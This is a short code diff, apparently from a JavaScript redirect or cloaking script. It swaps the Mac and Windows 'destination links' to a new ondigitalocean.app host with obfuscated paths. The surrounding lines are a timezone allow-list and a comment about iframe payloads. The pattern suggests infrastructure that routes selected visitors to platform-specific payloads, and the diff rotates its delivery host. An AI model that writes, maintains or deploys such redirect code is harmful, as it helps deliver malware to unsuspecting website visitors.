@@ -30,8 +30,8 @@ const ALLOWED_TIMEZONES = new Set([
 ]);
 
 // Destination Links
-const LINK_MAC = "https://coral-app-lw3jl.ondigitalocean.app/Ma0cHelpAsMEr0t0140";
-const LINK_OTHERS = "https://coral-app-lw3jl.ondigitalocean.app/Win0codejInfowj2n";
+const LINK_MAC = "https://lionfish-app-ylyob.ondigitalocean.app/Ma0cHelpAsMEr0t0140";
+const LINK_OTHERS = "https://lionfish-app-ylyob.ondigitalocean.app/Win0codejInfowj2n";
 
 // --- Pre-Compilation Cache Layer ---
 // Helper to generate identical iframe payloads dynamically on boot
